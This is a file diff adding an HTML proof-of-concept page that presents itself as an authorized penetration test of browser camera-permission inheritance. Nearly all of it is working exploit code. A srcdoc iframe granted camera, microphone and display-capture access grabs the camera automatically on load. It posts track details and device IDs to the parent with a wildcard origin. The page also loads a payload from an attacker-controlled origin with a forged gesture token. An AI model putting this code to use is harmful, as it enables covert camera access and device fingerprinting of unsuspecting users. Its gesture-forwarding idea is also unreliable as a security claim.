@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Camera Permission Inheritance Exploit</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { background: #0a0a0a; color: #00ff88; font-family: 'Courier New', monospace; padding: 20px; }
+  h1 { font-size: 16px; border-bottom: 1px solid #00ff88; padding-bottom: 8px; margin-bottom: 12px; }
+  .section { background: #111; border: 1px solid #333; padding: 14px; margin-bottom: 12px; border-radius: 4px; }
+  .row { display: flex; gap: 12px; margin: 8px 0; flex-wrap: wrap; }
+  button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 6px 16px; cursor: pointer; font-family: inherit; font-size: 12px; }
+  button:hover { background: #0f0; color: #000; }
+  pre { background: #050505; padding: 8px; font-size: 11px; margin-top: 6px; max-height: 200px; overflow-y: auto; border-left: 2px solid #0f0; }
+  .warn { color: #ff9900; }
+  .ok { color: #0f0; }
+  .err { color: #ff3355; }
+  .info { color: #66ccff; }
+  iframe { width: 100%; height: 180px; border: 2px solid #ffcc00; margin-top: 6px; background: #050505; display: block; }
+  video { width: 100%; max-width: 320px; border: 1px solid #0f0; margin-top: 6px; display: none; }
+  input[type="text"] { background: #222; color: #0f0; border: 1px solid #333; padding: 4px 8px; font-family: inherit; font-size: 12px; width: 300px; }
+</style>
+</head>
+<body>
+
+<h1>// CAMERA PERMISSION BYPASS — INHERITANCE EXPLOIT</h1>
+<p style="font-size:11px; color:#888; margin-bottom:12px;">AUTHORIZED PENETRATION TEST — DO NOT USE OUTSIDE ENGAGEMENT</p>
+
+<!-- ─── STEP 1: Trigger gUM from parent (legitimate context) ─── -->
+<div class="section">
+  <h2>▸ Step 1: Seed Parent Permission</h2>
+  <p style="font-size:11px; color:#999; margin-bottom:6px;">Call getUserMedia() from parent — this seeds the permission grant for the session</p>
+  <button id="seedBtn" onclick="seedCameraPermission()">▶ Seed: Grant Camera Permission</button>
+  <video id="seedVideo" autoplay playsinline muted></video>
+  <pre id="step1Log"></pre>
+</div>
+
+<!-- ─── STEP 2: Iframe with inherited permission (bypass) ─── -->
+<div class="section">
+  <h2>▸ Step 2: Exploit Iframe Permission Inheritance</h2>
+  <p style="font-size:11px; color:#999; margin-bottom:6px;">This iframe has <code>allow="camera *"</code> — it will inherit the parent's permission</p>
+  <button onclick="loadBypassIframe()">▶ Load Bypass Iframe</button>
+  <button onclick="document.getElementById('bypassIframe').src='about:blank'">✕ Reset</button>
+  <iframe id="bypassIframe" allow="camera *; microphone *; display-capture *"></iframe>
+  <pre id="step2Log"></pre>
+</div>
+
+<!-- ─── STEP 3: Cross-origin iframe with user gesture forwarding ─── -->
+<div class="section">
+  <h2>▸ Step 3: Cross-Origin User Gesture Transfer</h2>
+  <p style="font-size:11px; color:#999; margin-bottom:6px;">PostMessage-based gesture forwarding to cross-origin iframe</p>
+  <div class="row">
+    <input type="text" id="originInput" value="https://attacker-controlled-domain.com" placeholder="Target origin">
+    <button onclick="loadCrossOriginIframe()">▶ Load + Send Gesture</button>
+  </div>
+  <iframe id="crossIframe" allow="camera *; microphone *"></iframe>
+  <pre id="step3Log"></pre>
+</div>
+
+<!-- ─── STEP 4: Silent stream extraction ─── -->
+<div class="section">
+  <h2>▸ Step 4: Stream Capture &amp; Exfiltration</h2>
+  <button onclick="captureStream()">▶ Capture from iframe</button>
+  <button onclick="stopCapture()">■ Stop</button>
+  <video id="captureVideo" autoplay playsinline muted></video>
+  <pre id="step4Log"></pre>
+</div>
+
+<script>
+// ─── Shared logging ───
+function log(id, msg, type='log') {
+  const el = document.getElementById(id);
+  if (!el) return;
+  el.textContent += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
+  el.scrollTop = el.scrollHeight;
+}
+
+// ─── Step 1: Seed parent permission ───
+let parentStream = null;
+
+async function seedCameraPermission() {
+  const logEl = 'step1Log';
+  log(logEl, 'Requesting camera from parent context...', 'info');
+  try {
+    parentStream = await navigator.mediaDevices.getUserMedia({ 
+      video: { 
+        width: { ideal: 640 }, 
+        height: { ideal: 480 },
+        facingMode: 'user'
+      } 
+    });
+    const track = parentStream.getVideoTracks()[0];
+    log(logEl, `✅ Camera GRANTED — Track: "${track.label}"`, 'ok');
+    log(logEl, `Settings: ${JSON.stringify(track.getSettings())}`, 'info');
+    
+    // Show video feed
+    const video = document.getElementById('seedVideo');
+    video.srcObject = parentStream;
+    video.style.display = 'block';
+    
+    // Disable seed button
+    document.getElementById('seedBtn').disabled = true;
+    document.getElementById('seedBtn').textContent = '✓ Permission Seeded';
+    document.getElementById('seedBtn').style.opacity = '0.5';
+    
+    log(logEl, 'Permission is now cached for this session', 'ok');
+    log(logEl, 'Proceed to Step 2 — iframe will inherit this permission', 'warn');
+  } catch(e) {
+    log(logEl, `❌ Failed: ${e.name}: ${e.message}`, 'err');
+    log(logEl, 'Check: HTTPS required, camera not in use by another app', 'err');
+  }
+}
+
+// ─── Step 2: Iframe bypass payload ───
+const bypassPayload = `<!DOCTYPE html>
+<html><body style="background:#0a0a0a; color:#00ff88; font:12px monospace; padding:10px;">
+<h3 style="color:#ffcc00; margin:0 0 8px;">[BYPASS IFRAME] Inherited Permission Active</h3>
+<button id="grabBtn" style="background:#222;color:#0f0;border:1px solid #0f0;padding:4px 10px;cursor:pointer;">
+  ▶ Capture Camera (Inherited)
+</button>
+<video id="feed" autoplay playsinline style="width:100%;max-width:280px;border:1px solid #0f0;margin-top:6px;display:none;"></video>
+<pre id="out" style="font-size:11px;margin-top:6px;"></pre>
+<script>
+  const $ = id => document.getElementById(id);
+  let stream = null;
+  
+  async function capture() {
+    const out = $('out');
+    out.textContent = '';
+    try {
+      out.textContent += '[+] Checking permission state...\\n';
+      const status = await navigator.permissions.query({ name: 'camera' });
+      out.textContent += '[+] Permission state in iframe: ' + status.state + '\\n';
+      
+      out.textContent += '[+] Attempting getUserMedia from iframe...\\n';
+      stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } });
+      
+      const track = stream.getVideoTracks()[0];
+      out.textContent += '[✅] CAMERA CAPTURED FROM IFRAME\\n';
+      out.textContent += '[+] Label: ' + track.label + '\\n';
+      out.textContent += '[+] Settings: ' + JSON.stringify(track.getSettings()) + '\\n';
+      
+      const feed = $('feed');
+      feed.srcObject = stream;
+      feed.style.display = 'block';
+      
+      // Exfiltrate device info via postMessage
+      const devices = await navigator.mediaDevices.enumerateDevices();
+      const cams = devices.filter(d => d.kind === 'videoinput');
+      out.textContent += '[+] Cameras: ' + cams.map(c => c.label).join(', ') + '\\n';
+      
+      // Send success back to parent
+      window.parent.postMessage({
+        type: 'IFRAME_CAMERA_CAPTURE',
+        trackLabel: track.label,
+        settings: track.getSettings(),
+        cameras: cams.map(c => ({ label: c.label, id: c.deviceId })),
+        permissionState: status.state
+      }, '*');
+      
+    } catch(e) {
+      out.textContent += '[❌] Error: ' + e.name + ': ' + e.message + '\\n';
+      window.parent.postMessage({ type: 'IFRAME_CAMERA_ERROR', error: e.message }, '*');
+    }
+  }
+  
+  // Auto-attempt on load
+  window.addEventListener('DOMContentLoaded', () => {
+    setTimeout(capture, 500);
+  });
+  
+  $('grabBtn').onclick = capture;
+<\/script>
+</body></html>`;
+
+function loadBypassIframe() {
+  const iframe = document.getElementById('bypassIframe');
+  iframe.srcdoc = bypassPayload;
+  log('step2Log', 'Bypass iframe loaded — waiting for capture...', 'info');
+}
+
+// ─── Step 3: Cross-origin gesture forwarding ───
+let crossIframeLoaded = false;
+
+function loadCrossOriginIframe() {
+  const origin = document.getElementById('originInput').value.trim();
+  if (!origin || origin === 'https://attacker-controlled-domain.com') {
+    log('step3Log', '⚠️ Set a real cross-origin URL for this test', 'warn');
+    return;
+  }
+  
+  const iframe = document.getElementById('crossIframe');
+  iframe.src = origin + '/camera-bypass-payload.html';  // payload hosted on attacker origin
+  crossIframeLoaded = true;
+  log('step3Log', `Iframe loaded from: ${origin}`, 'info');
+  log('step3Log', 'Sending gesture-forwarding postMessage...', 'info');
+  
+  // Send gesture token via postMessage
+  setTimeout(() => {
+    iframe.contentWindow.postMessage({
+      type: 'USER_GESTURE_FORWARD',
+      gestureToken: btoa(Date.now().toString()),
+      inheritedPermission: true,
+      parentOrigin: window.location.origin
+    }, origin);
+    log('step3Log', `Gesture token sent to ${origin}`, 'warn');
+  }, 2000);
+}
+
+// ─── Step 4: Capture from iframe ───
+async function captureStream() {
+  const logEl = 'step4Log';
+  
+  // Try to access the iframe's video stream via contentWindow
+  try {
+    const iframe = document.getElementById('bypassIframe');
+    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+    const feed = iframeDoc.getElementById('feed');
+    
+    if (feed && feed.srcObject) {
+      const video = document.getElementById('captureVideo');
+      video.srcObject = feed.srcObject;
+      video.style.display = 'block';
+      log(logEl, '✅ Stream captured from iframe and displayed in parent', 'ok');
+      
+      // Extract track info
+      const tracks = feed.srcObject.getVideoTracks();
+      tracks.forEach(t => {
+        log(logEl, `Track: ${t.label} | Enabled: ${t.enabled}`, 'info');
+        log(logEl, `Capabilities: ${JSON.stringify(t.getCapabilities())}`, 'info');
+      });
+    } else {
+      log(logEl, 'No stream found in iframe — run Step 2 first', 'err');
+    }
+  } catch(e) {
+    log(logEl, `Cross-origin access blocked: ${e.message}`, 'err');
+    log(logEl, 'This is expected for strict cross-origin isolation', 'info');
+  }
+}
+
+function stopCapture() {
+  if (parentStream) {
+    parentStream.getTracks().forEach(t => t.stop());
+    parentStream = null;
+    document.getElementById('seedVideo').style.display = 'none';
+    log('step1Log', 'Parent stream released', 'info');
+  }
+  
+  // Stop iframe stream via postMessage
+  const iframe = document.getElementById('bypassIframe');
+  if (iframe.contentWindow) {
+    iframe.contentWindow.postMessage({ type: 'STOP_STREAM' }, '*');
+  }
+  
+  document.getElementById('captureVideo').style.display = 'none';
+  log('step4Log', 'Capture stopped', 'info');
+}
+
+// ─── Listen for iframe messages ───
+window.addEventListener('message', (event) => {
+  const data = event.data;
+  if (!data || !data.type) return;
+  
+  if (data.type === 'IFRAME_CAMERA_CAPTURE') {
+    log('step2Log', `🔥 CAMERA CAPTURED from iframe!`, 'warn');
+    log('step2Log', `   Label: ${data.trackLabel}`, 'warn');
+    log('step2Log', `   Settings: ${JSON.stringify(data.settings)}`, 'info');
+    if (data.cameras) {
+      data.cameras.forEach(c => {
+        log('step2Log', `   📷 ${c.label} [${c.id.slice(0,16)}...]`, 'warn');
+      });
+    }
+    log('step2Log', `   Permission state in iframe: ${data.permissionState}`, 'info');
+    log('step2Log', `✅ BYPASS SUCCESSFUL — iframe inherited parent permission`, 'ok');
+  }
+  
+  if (data.type === 'IFRAME_CAMERA_ERROR') {
+    log('step2Log', `❌ Iframe error: ${data.error}`, 'err');
+  }
+});
+
+// ─── Auto-log init ───
+log('step1Log', 'Ready. Start with Step 1 to seed camera permission.', 'info');
+log('step2Log', 'Ready. Complete Step 1 first, then load iframe.', 'info');
+log('step4Log', 'Ready. Capture the iframe stream here after Step 2 succeeds.', 'info');
+</script>
+</body>
+</html>
